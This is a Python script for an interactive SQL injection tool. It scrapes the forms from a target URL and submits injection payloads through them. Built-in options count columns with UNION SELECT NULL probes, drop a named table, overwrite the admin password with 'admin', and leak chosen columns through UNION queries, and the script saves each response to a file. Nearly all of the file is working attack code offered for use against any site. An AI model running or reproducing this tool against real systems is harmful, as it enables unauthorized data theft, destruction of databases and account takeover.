import sys
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup

class SQLInjection:

    def __init__(self, url):
        self.session = requests.session()
        self.url = url
        self.forms = BeautifulSoup(self.session.get(url).text, "html.parser").find_all("form")
        self.selected_form = None

    def select_form(self):
        """
        This function allows users to select a form to inject sql later
        Selected form saved in selected_form variable
        """
        self.selected_form = None
        for i in range(len(self.forms)):
            form = self.forms[i]
            method = form.attrs.get("method", "get")
            print(i+1, ". Form with {} method and with fields : ".format(method))
            for tag in form.find_all("input"):
                inp_type = tag.attrs.get("type", "text")
                inp_name = tag.attrs.get("name")
                inp_value = tag.attrs.get("value", "")
                print(" -> ",inp_name)
            print("--"*15)
        while not self.selected_form:
            try:
                self.selected_form = self.forms[int(input("Please select a form: "))-1]
            except:
                print("Please enter valiid number in between [1 -" + len(self.forms) + "]")
                self.select_form = None

    
    def start_injection(self): 
        """
        This function allows users to inject sql queries to selected form.
        There are 2 option. First one, user can give own sql queries to form inputs.
        The other option, user can select several exist queries like find out column count.
        After all of them, response saved in response.html file.
        """        
        method = self.selected_form.attrs.get("method").strip().lower()
        action = self.selected_form.attrs.get("action")
        action_url = urljoin(self.url, action)
        form_data = {}
        for tag in self.selected_form.find_all("input"):
            tag_name = tag.attrs.get("name")
            tag_type = tag.attrs.get("type", "text")
            if tag["type"] == "hidden":
                # if there is hidden input like csrf token, 
                # default value of this field should be added to inputs
                form_data[tag_name] = tag.attrs.get("value", "")
            elif tag["type"] != "submit":
                form_data[tag_name] = (tag['type'], "not_hidden")

        injection_type = int(input( "Select type of injection: \n"+
                                    "0: Enter your own query\n" +
                                    "1: Resolve column count of table\n"+
                                    "2: Drop table if you know its name\n"+
                                    "3: Change admin password as admin(if you are lucky)\n"+
                                    "4: Leak a column field\n"))

        if injection_type==0:
            for tag_name, tag_type in form_data.items():
                if isinstance(tag_type, tuple):
                    value = input("Field: '{}' Type: {} Enter your query(value): ".format(tag_name, tag_type[0]))
                    form_data[tag_name] = value
            
            if method == "post":
                response = self.session.post(action_url, data=form_data)
            elif method == "get":
                response = self.session.get(action_url, params=form_data)
            
            print("Status code of response -> ", response.status_code)
            with open("response.html", "w+") as f:
                f.write(response.text)
            print("You can see response.html")

        elif injection_type == 1:
            for tag_name, tag_type in form_data.items():
                if isinstance(tag_type, tuple) and tag_type[0] == "text":
                    injected_tag_name = tag_name
            status_code = 500
            column_count = 0
            while status_code == 500:
                # Until the successful request, 
                # sql injection is made by incrementing NULL count in UNION query
                column_count += 1
                form_data[injected_tag_name] = "' UNION SELECT " + "NULL,"*(column_count-1) + "NULL--"
                
                if method == "post":
                    response = self.session.post(action_url, data=form_data)
                elif method == "get":
                    response = self.session.get(action_url, params=form_data)
                status_code = int(response.status_code)
            if column_count == 1:
                print("The used table has",column_count,"column or the website NONINJECTABLE.")  
            else:
                print("The used table has",column_count,"column.")

        else:
            for tag_name, tag_type in form_data.items():
                if isinstance(tag_type, tuple):
                    if injection_type == 2:
                        form_data[tag_name] = "';DROP TABLE " + input("Enter table name: ") + ";--"
                    elif injection_type == 3:
                        form_data[tag_name] = "';UPDATE " + input("Enter table name: ") + " SET password='admin' WHERE username='admin';--"
                    elif injection_type == 4:
                        status_code = 500
                        column_count = 0
                        while status_code == 500:
                            # Until the successful request, 
                            # sql injection is made by incrementing NULL count in UNION query
                            column_count += 1
                            form_data[tag_name] = "' UNION SELECT " + "NULL,"*(column_count-1) + "NULL--"
                            if method == "post":
                                response = self.session.post(action_url, data=form_data)
                            elif method == "get":
                                response = self.session.get(action_url, params=form_data)
                            status_code = int(response.status_code)

                        form_data[tag_name] = "' or 1=1 UNION SELECT " +  input("Enter column name: ") + "," + "NULL, "*(column_count-2) + "NULL FROM "+ input("Enter table name: ") + " " + input("Enter WHERE query: ")+";--"

            if method == "post":
                response = self.session.post(action_url, data=form_data)
            elif method == "get":
                response = self.session.get(action_url, params=form_data)
            print("Status code of response -> ", response.status_code)
            with open("response.html", "w+") as f:
                f.write(response.text)
            print("You can see response.html")


if __name__ == "__main__": 
    sql_injection = SQLInjection(input("URL address for SQL injection:"))

    if not sql_injection.forms:
        print("There is no any form.")

    else:
        print("Firstly, you should select a form.")
        sql_injection.select_form()
        selected_function = None
        function_choices = ["select_form", "start_injection"]

        while not selected_function:
            # This is an infinite loop, till the user terminate the program.
            print("Enter what do you want to do: ")
            print("1: Select another form \n" +\
                    "2: Start SQL injection after select a form \n")
            try:
                selected_function = getattr(sql_injection, function_choices[int(input())-1])
                selected_function()
            except KeyboardInterrupt:
                print("Goodbye..")
                break
            except:
                print("Please enter valid number.")
            
            selected_function = None

            
        

        
